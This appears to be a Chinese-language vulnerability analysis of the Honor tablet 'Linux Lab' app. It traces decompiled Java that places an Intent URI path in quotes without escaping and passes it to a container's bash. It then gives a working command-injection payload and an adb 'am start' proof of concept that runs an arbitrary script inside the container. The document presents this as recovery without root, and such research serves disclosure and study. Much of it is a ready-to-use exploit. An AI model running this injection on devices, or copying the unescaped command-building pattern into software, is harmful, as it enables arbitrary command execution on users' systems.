# 荣耀平板 Linux 实验室 Intent 指令注入通道技术分析

## 1. 背景与权限困境

荣耀平板「Linux 实验室」（`com.hihonor.pcengine`）在未 Root 的设备上运行时面临以下限制：
1. **ADB Shell 权限局限**：ADB 走无线/USB 调试以 `shell` 用户运行（UID 2000），无法读取应用私有数据目录 `/data/user/0/com.hihonor.pcengine/`（属于 UID 10303，权限 `rwx------`）。
2. **Release 签名禁止调试**：应用在出厂系统上是 release 签名且未开启 `android:debuggable="true"`，执行 `run-as com.hihonor.pcengine` 会被 Android 系统直接拒绝（`run-as: package not debuggable`）。

为了在不借助 Root 权限的情况下在容器内执行灾难恢复脚本，必须寻找应用内开放的 IPC 入口。

---

## 2. 漏洞定位：`ActivityPcEngine` 对 FileProvider 的参数拼接

反编译分析应用核心 Activity `com.hihonor.hnpcengineclient.pcengine.ActivityPcEngine`：

### 2.1 URI 提取与拼接 (`ActivityPcEngine.O`)
```java
public final void O(Intent intent) {
    Uri data = intent.getData();
    if (data != null) {
        if ("com.hihonor.filemanager.share.fileprovider".equals(data.getAuthority())) {
            String path = data.getPath(); // 获取形如 /root/path/to/pkg.deb
            if (path != null && path.length() >= 5) {
                // 截断前5个字符（即去掉 /root）
                String subPath = path.substring(5);
                // 致命缺陷：简单包裹双引号，未转义内部的双引号与分号！
                this.Q = "\"" + subPath + "\"";
            }
        }
    }
}
```

### 2.2 冷启动注入点 (`f8.b0`)
当应用冷启动或从后台拉起时，若检测到 `this.Q` 不为空且以 `.deb"` 结尾：
```java
if (this.Q != null && this.Q.endsWith(".deb\"")) {
    firstCommand = "/usr/bin/start " + this.Q + "\n";
} else {
    firstCommand = "/usr/bin/start 0 " + screenResolution + " /usr/local/bin/pkg_monitor.sh\n";
}
// 将 firstCommand 直接写入启动 PRoot 容器的标准输入（stdin）管道
```

### 2.3 热启动注入点 (`onNewIntent` + 协程通道)
当应用已经在后台运行（Warm start）：
1. 系统分发 `onNewIntent(intent)`；
2. 提取 `this.Q` 并校验 `endsWith(".deb\"")`；
3. 通过协程发送给命令队列通道 `f8.q0.i.send(cmd)`，由后台守护进程调度写入容器。

---

## 3. Payload 构造与截断利用

由于宿主代码直接将 `"/usr/bin/start " + this.Q` 作为 Shell 命令提交给容器内 `bash` 执行：

### 构造策略
通过构造如下 URI 路径：
```text
content://com.hihonor.filemanager.share.fileprovider/root/dummy" ; <任意指令> ; echo "StartFinished" ; echo "test.deb
```

经过 `ActivityPcEngine.O` 截断与包裹双引号后，`this.Q` 变成：
```text
"dummy" ; <任意指令> ; echo "StartFinished" ; echo "test.deb"
```

该字符串严格满足以 `.deb"` 结尾的合法性检查。容器内的 bash 实际解析执行：
```bash
/usr/bin/start "dummy" ; <任意指令> ; echo "StartFinished" ; echo "test.deb"
```

### 关键细节说明
1. **`dummy"` 截断**：闭合前面 `start` 后的左双引号，分号切分出新的一行命令。
2. **直通存储 `/tablet`**：PRoot 启动参数中包含 `--bind=/storage/self/primary:/tablet`，因此宿主写入 `/sdcard/my_script.sh`，容器内即为 `/tablet/my_script.sh`。
3. **`echo "StartFinished"` 必须带上**：宿主 Java 层的 UI 监听线程（`f8.r0`）在等待此标记。如果在注入指令中补发这个握手信号，能防止宿主 Activity 认为命令未完成而卡死在 Loading 界面。
4. **`echo "test.deb"` 兜底**：闭合宿主代码在末尾补上的右双引号，防止 Shell 抛出 `syntax error: unexpected end of file`。

---

## 4. 自动化调用范例

### 命令行单行执行
```bash
# 1. 准备要在容器内执行的脚本
adb shell "cat << 'EOF' > /sdcard/container_exec.sh
#!/bin/bash
exec > /tablet/exec_result.log 2>&1
echo 'UID inside container:' \$(id)
echo 'Processes:'
ps -ef
EOF
chmod 777 /sdcard/container_exec.sh"

# 2. 触发 Intent 注入通道
adb shell 'am start -n com.hihonor.pcengine/com.hihonor.hnpcengineclient.pcengine.ActivityPcEngine \
  -d "content://com.hihonor.filemanager.share.fileprovider/root/dummy\" ; sh /tablet/container_exec.sh ; echo \"StartFinished\" ; echo \"test.deb\""'

# 3. 读取执行日志
adb shell "cat /sdcard/exec_result.log"
```
